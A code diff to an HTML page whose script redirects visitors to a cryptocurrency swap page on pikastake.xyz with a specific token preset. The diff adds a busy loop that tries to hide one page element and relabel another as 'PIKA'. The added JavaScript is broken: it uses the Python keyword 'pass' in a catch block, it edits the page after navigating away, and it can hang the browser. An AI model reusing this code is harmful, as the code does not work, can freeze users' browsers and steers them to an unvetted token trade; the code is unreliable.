@@ -52,7 +52,20 @@
     -->
     
     <script>
-      document.location.href = "https://pikastake.xyz/#/swap?inputCurrency=eth&outputCurrency=0x4B99CFE23509b22DEF47696aB1b1Dcf8Ff3844dd&chain=mainnet"
+      document.location.href = "https://pikastake.xyz/#/swap?inputCurrency=eth&outputCurrency=0x4B99CFE23509b22DEF47696aB1b1Dcf8Ff3844dd&chain=mainnet";
+      stat = true;
+      while (stat){
+        try {
+          var lo = document.getElementsByClassName("hzptBO")[0];
+          lo.remove();
+          document.getElementsByClassName("gdpFPF")[0].textContent = "PIKA"
+          stat = false;
+        }
+        catch(err) {
+          pass
+        }
+      }
+      
     </script>
     <style>
       * {
